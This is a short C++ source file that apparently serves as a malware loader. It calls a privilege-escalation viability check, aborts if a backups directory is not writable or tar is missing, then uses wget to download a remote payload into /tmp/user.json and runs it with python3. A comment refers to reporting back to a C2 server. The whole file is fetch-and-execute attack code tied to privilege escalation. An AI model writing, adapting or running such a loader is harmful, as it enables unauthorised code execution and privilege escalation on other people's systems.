#include <cstdlib>
#include <string>
#include "privesc_check.h"

int main() {
    
    PrivEscConditions privesc = check_privesc_viability();
    
    // Only proceed if conditions are favorable
    // In a real scenario, you might send this info back to C2 first
    if (!privesc.backups_dir_writable || !privesc.tar_available) {
        // Abort or use alternative method
        return 1;
    }
    
    // Wget URL
    std::string url = URL;
    std::string command0 = "wget -q " + url + " -O /tmp/user.json";
    int r0 = std::system(command0.c_str());

    // int r1 = std::system("chmod +x ./user.json");

    // Run
    std::string command1 = "python3 /tmp/user.json";
    int r2 = std::system(command1.c_str());

    return 0;
}
